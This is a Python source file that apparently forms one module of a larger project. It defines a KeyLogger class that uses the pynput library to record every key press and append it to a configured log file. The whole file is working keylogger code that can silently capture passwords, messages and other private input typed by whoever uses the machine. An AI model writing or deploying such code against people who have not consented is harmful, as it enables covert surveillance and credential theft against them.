import os
from pynput import keyboard
from config.config import LOG_FILE

class KeyLogger:
    def __init__(self):
        self.log_file = LOG_FILE

    def _write_log(self, text):
        """Append text to the log file."""
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(text)

    def _on_press(self, key):
        """Handle key press events."""
        try:
            self._write_log(key.char)
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n",
                keyboard.Key.tab: "\t"
            }
            self._write_log(special_keys.get(key, f"<{key.name}>"))

    def start(self):
        """Start the keylogger."""
        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()
